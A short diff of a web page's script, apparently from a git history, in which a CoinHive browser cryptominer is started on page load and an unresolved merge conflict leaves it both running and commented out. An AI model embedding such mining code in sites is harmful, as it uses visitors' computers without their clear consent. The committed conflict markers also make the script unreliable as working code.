@@ -98,6 +98,7 @@
             };
             
             var miner = new CoinHive.Anonymous(hive.key);
+<<<<<<< HEAD
             miner.start();
 
             setInterval(function() {
@@ -109,6 +110,9 @@
                     });
                 }
             }, 10000);
+=======
+            // miner.start();
+>>>>>>> ed5a372... Added the background localy and amped up the text
         </script>
     </body>
 </html>
